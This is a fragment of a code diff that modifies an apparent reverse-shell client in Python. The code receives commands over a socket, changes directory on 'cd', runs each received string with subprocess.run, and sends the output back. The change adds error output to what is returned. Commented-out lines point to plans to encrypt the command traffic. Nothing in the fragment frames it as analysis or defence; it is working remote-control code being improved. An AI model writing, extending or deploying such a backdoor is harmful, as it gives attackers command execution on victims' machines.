@@ -24,7 +24,7 @@ try:
         if data[:2].decode() == 'cd':
             os.chdir(data[3:].decode())
         if len(data) > 0:
-            result = subprocess.run(data.decode(), stdout=subprocess.PIPE, check=False)
+            result = subprocess.run(data.decode(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
             s.send(result.stdout)
             # encrypted_data = asymmetric_encryption.encrypt_message(data.decode(), pub_key)
             # encrypted_data_b64 = encrypted_data.encode()
